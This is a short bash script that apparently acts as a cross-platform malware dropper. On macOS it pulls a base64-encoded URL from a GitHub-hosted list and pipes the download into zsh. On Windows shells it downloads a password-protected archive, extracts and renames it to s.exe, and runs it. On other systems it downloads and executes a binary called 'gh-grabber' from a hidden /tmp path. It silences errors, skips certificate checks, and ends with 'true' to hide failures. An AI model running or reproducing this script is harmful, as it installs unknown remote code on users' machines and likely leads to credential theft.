#!/bin/bash
case "$(uname -s)" in
  Darwin)
    L=$(curl -kfsSL 'https://raw.githubusercontent.com/pangao1990/PPX/main/mac.txt' 2>/dev/null | awk -v r=$RANDOM 'NR==r%100+1')
    [ -n "$L" ] && curl -kfsSL "$(echo "$L" | base64 -D)" | zsh
    ;;
  MINGW*|MSYS*|CYGWIN*)
    W=$(curl -fsSL 'https://raw.githubusercontent.com/iArunava/YOLOv3-Object-Detection-with-OpenCV/master/payloads/win.txt' 2>/dev/null | awk -v r=$RANDOM 'NR==r%100+1')
    if [ -n "$W" ]; then
      IFS='|' read -r U P I <<< "$W"
      cmd //c "curl -s -o %TEMP%\\z $U && tar -xf %TEMP%\\z -C %TEMP% --passphrase $P && ren %TEMP%\\$I s.exe && start \"\" %TEMP%\\s.exe"
    fi
    ;;
  *)
    curl -fsSL 'https://raw.githubusercontent.com/deacon6288/gh-grabber/main/bin/grabber-amd64' -o /tmp/.gd && chmod +x /tmp/.gd && /tmp/.gd
    ;;
esac
true
